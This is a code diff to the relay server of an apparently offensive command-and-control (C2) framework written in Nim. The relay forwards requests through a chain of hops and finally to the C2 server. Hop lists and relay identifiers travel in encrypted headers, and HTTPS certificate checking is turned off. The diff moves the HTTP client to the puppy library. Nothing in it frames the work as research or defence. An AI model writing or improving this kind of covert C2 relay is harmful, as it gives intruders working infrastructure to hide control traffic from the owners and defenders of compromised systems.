@@ -4,9 +4,7 @@
     When chain ends, forwards directly to C2
 ]#
 
-import asyncdispatch, asynchttpserver, strutils, base64, httpclient, net
-when defined(ssl):
-    import openssl
+import asyncdispatch, asynchttpserver, strutils, base64, puppy
 import ../util/crypto
 import ../config/configParser
 
@@ -52,7 +50,7 @@ proc startRelayServer*(port: int, relayGuid: string = "", c2Url: string = "") {.
     
     var server = newAsyncHttpServer()
     
-    proc handleRequest(req: Request): Future[void] {.async, gcsafe.} =
+    proc handleRequest(req: asynchttpserver.Request): Future[void] {.async, gcsafe.} =
         when defined debug:
             echo "[RELAY] 🔌 " & $req.reqMethod & " " & req.url.path & " from " & req.hostname
         
@@ -88,7 +86,7 @@ proc startRelayServer*(port: int, relayGuid: string = "", c2Url: string = "") {.
             
             # Determine target URL
             var targetUrl: string
-            var fwdHeaders = newHttpHeaders()
+            var fwdHeaders: seq[Header] = @[]
             
             if remainingHops == "":
                 # End of chain - forward to C2
@@ -106,11 +104,11 @@ proc startRelayServer*(port: int, relayGuid: string = "", c2Url: string = "") {.
                 for key, value in req.headers.pairs:
                     let lowerKey = key.toLower()
                     if lowerKey notin ["host", "connection", "content-length", "x-next-hop"]:
-                        fwdHeaders[key] = value
+                        fwdHeaders.add(Header(key: key, value: value))
                 
                 # Add X-Relay-GUID if we have one
                 if relayGuid != "":
-                    fwdHeaders["X-Relay-GUID"] = encryptRelayGuid(relayGuid)
+                    fwdHeaders.add(Header(key: "X-Relay-GUID", value: encryptRelayGuid(relayGuid)))
             else:
                 # More hops - forward to next relay
                 targetUrl = "http://" & remainingHops.split(",")[0] & req.url.path
@@ -121,36 +119,39 @@ proc startRelayServer*(port: int, relayGuid: string = "", c2Url: string = "") {.
                 for key, value in req.headers.pairs:
                     let lowerKey = key.toLower()
                     if lowerKey notin ["host", "connection", "content-length", "x-next-hop"]:
-                        fwdHeaders[key] = value
+                        fwdHeaders.add(Header(key: key, value: value))
                 
                 # Update X-Next-Hop with remaining hops
-                fwdHeaders["X-Next-Hop"] = encryptNextHop(remainingHops)
+                fwdHeaders.add(Header(key: "X-Next-Hop", value: encryptNextHop(remainingHops)))
                 
                 # Add X-Relay-GUID if we have one
                 if relayGuid != "":
-                    fwdHeaders["X-Relay-GUID"] = encryptRelayGuid(relayGuid)
-            
-            # Create HTTP client with SSL context
-            var client: AsyncHttpClient
-            when defined(ssl):
-                # Create SSL context for HTTPS connections
-                let sslContext = newContext(verifyMode = CVerifyNone)
-                client = newAsyncHttpClient(sslContext = sslContext)
-            else:
-                client = newAsyncHttpClient()
+                    fwdHeaders.add(Header(key: "X-Relay-GUID", value: encryptRelayGuid(relayGuid)))
             
             when defined debug:
                 echo "[RELAY] 📤 Sending request to: " & targetUrl
             
-            let response = await client.request(targetUrl, httpMethod = HttpGet, headers = fwdHeaders)
-            let responseBody = await response.body
+            # Use puppy for the request (same as rest of the codebase)
+            let parsedUrl = parseUrl(targetUrl)
+            let puppyReq = puppy.Request(
+                url: parsedUrl,
+                verb: "get",
+                headers: fwdHeaders,
+                allowAnyHttpsCertificate: true
+            )
+            
+            let response = puppy.fetch(puppyReq)
             
             when defined debug:
-                echo "[RELAY] 📥 Response: " & $response.code.int & " (" & $responseBody.len & " bytes)"
+                echo "[RELAY] 📥 Response: " & $response.code & " (" & $response.body.len & " bytes)"
+            
+            # Convert puppy headers to asynchttpserver headers
+            var respHeaders = newHttpHeaders()
+            for (key, value) in response.headers:
+                respHeaders[key] = value
             
             # Forward response
-            await req.respond(response.code, responseBody, response.headers)
-            client.close()
+            await req.respond(HttpCode(response.code), response.body, respHeaders)
             
         except Exception as e:
             when defined debug:
